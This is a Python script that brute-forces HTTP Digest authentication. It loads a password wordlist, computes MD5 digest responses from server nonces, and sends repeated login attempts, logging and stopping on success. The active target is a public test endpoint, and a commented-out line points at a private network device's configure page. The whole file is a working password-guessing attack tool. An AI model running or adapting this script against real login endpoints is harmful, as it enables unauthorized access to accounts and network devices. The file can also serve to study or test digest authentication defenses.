import hashlib
import re
import requests
import secrets


# proud of this one
def md5(*args) -> str:
    string = ":".join(str(x) for x in args)
    return hashlib.md5(string.encode()).hexdigest()


regex = re.compile('([^" ]+)[:=] ?"?([^" ]+)"?')


def log(request, password, counter):
    print(
        f'\n\n Status {request.status_code} detected: used "{password}" and counter at {counter}'
    )
    with open("results.txt", "a") as results:
        results.write(
            f"Password: {password}\nCounter: {counter}\nStatus: {request.status_code}\n\n"
        )
    if 200 <= request.status_code < 300:
        print("Exiting")
        exit()


def hashes(user, realm, password, method, uri, nonce, nc, cnonce, qop, opaque) -> str:
    h1 = md5(user, realm, password)
    h2 = md5(method, uri)
    if qop:
        response = md5(h1, nonce, nc, cnonce, qop, h2)
    else:
        response = md5(h1, nonce, h2)

    return response


def parse_authheaders(authheader) -> tuple:
    authheaders_dict = dict(regex.findall(authheader))
    auth = {}
    auth["nonce"] = authheaders_dict["nonce"]
    try:
        auth["opaque"] = authheaders_dict["opaque"]
    except KeyError:
        auth["opaque"] = None
    return auth


def main() -> None:
    total = 0

    # url = 'http://172.16.1.1/configure'
    # url = 'https://jigsaw.w3.org/HTTP/Digest/'
    url = "http://httpbin.org/digest-auth/auth/guest/guest"
    user = "guest"
    uri = "/digest-auth/auth/guest/guest"
    # uri = '/HTTP/Digest/'
    method = "HEAD"
    filename = "num.txt"
    encoding = ""
    qop = None
    realm = None

    get_encoding = lambda encoding: "utf8" if encoding == "" else encoding

    with open(filename, encoding=get_encoding(encoding)) as file:
        passwords = file.readlines()
    passwords = [password.rstrip() for password in passwords]

    print(len(passwords), "passwords loaded")

    if total > len(passwords):
        print("Total is greater then amount of passwords, please change")
        exit()

    # get nonce, realm, and qop
    request = requests.head(url)
    header = dict(regex.findall(request.headers["www-authenticate"]))
    realm = header["realm"]
    try:
        qop = header["qop"]
    except KeyError:
        pass

    auth = parse_authheaders(request.headers["www-authenticate"])

    for i in range(total, len(passwords)):
        cnonce = secrets.token_hex(4)
        response = hashes(
            user,
            realm,
            passwords[i],
            method,
            uri,
            auth["nonce"],
            "00000001",
            cnonce,
            qop,
            auth["opaque"],
        )
        header = {
            "Authorization": f'Digest username="{user}", realm="{realm}", nonce="{auth["nonce"]}", uri="{uri}", algorithm=MD5, response="{response}"'
        }
        if auth["opaque"] != None:
            header["Authorization"] += f', opaque={auth["opaque"]}'
        if qop != None:
            header["Authorization"] += f', qop={qop}, nc=00000001, cnonce="{cnonce}"'

        request = requests.head(url, headers=header)
        # triggers on status codes other than 200 but i'd want to know about those, too
        if request.status_code != 401:
            log(request, passwords[i], i)
            # new nonces are only given on 401's, so we have to make another request for one
            request = requests.head(url)

        # finally, parse headers for new nonce. This will 'KeyError' if done on a 200 request it has do be done after the check for that
        auth = parse_authheaders(request.headers["www-authenticate"])
        # if i % 100 == 0:
        #     print(i, end=', ')
        print(i, passwords[i], request.status_code)

    print("La fin.")


if __name__ == "__main__":
    main()
